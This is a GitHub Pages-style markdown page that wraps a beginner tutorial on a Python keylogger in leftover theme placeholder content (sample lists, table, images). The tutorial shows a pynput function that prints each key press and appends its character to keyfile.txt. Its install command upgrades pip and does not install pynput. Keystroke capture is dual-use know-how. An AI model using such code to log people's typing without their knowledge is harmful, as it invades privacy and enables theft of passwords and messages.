---
layout: default
---

Text can be **bold**, _italic_, or ~~strikethrough~~.

[Link to another page](./another-page.html).

There should be whitespace between paragraphs.

There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.

# Installing and importing the required module and packages

For this project we need to install the _pynput_ package and make use of the _keyboard_ module.

The _keyboard_ moduel is required to monitor keyboard inputs. This allows for the program to listen for key presses.

> The package can be installed via the _Terminal_ using the following command:
>
> python.exe -m pip install --upgrade pip

Once the package is installed, we need to import the module using the following line:

```python
# Importing the necessary module
from pynput import keyboard
```

# Creating a function

Firstly, we define a function named _keyPressed_ that takes a _key_ parameter which represents the key that is pressed.

A print line is added to see the real-time presses.

The function then creates a file named "keyfile.txt" in append mode so that previous content in the file is not overwritten. This file will keep a record of all keys pressed. The _with_ ensures the file is properly closed after the code is executed.

Inside the _try_ block, the code attempts to get the character representation of the pressed key and if successfull it writes this character to "keyfile.txt" file.

The _except_ is used in case there are any exception that occur (when the key pressed doesnt have a character representaion, like Shift or Ctrl) in which case it will print out the message "Error getting char".

```python
def keyPressed(key):
    # Function to handle key press events

    # Print the string representation of the pressed key
    print(str(key))

    # Open a file named "keyfile.txt" in append mode
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Attempt to get the character representation of the key
            char = key.char
            # Write the character to the file
            logKey.write(char)
        except:
            # If an exception occurs (e.g., for special keys), print an error message
            print("Error getting char")
```

##### Header 5

1.  This is an ordered list following a header.
2.  This is an ordered list following a header.
3.  This is an ordered list following a header.

###### Header 6

| head1        | head two          | three |
|:-------------|:------------------|:------|
| ok           | good swedish fish | nice  |
| out of stock | good and plenty   | nice  |
| ok           | good `oreos`      | hmm   |
| ok           | good `zoute` drop | yumm  |

### There's a horizontal rule below this.

* * *

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

### Small image

![Octocat](https://github.githubassets.com/images/icons/emoji/octocat.png)

### Large image

![Branching](https://guides.github.com/activities/hello-world/branching.png)


### Definition lists can be used with HTML syntax.

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

```
Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
```

```
The final element.
```
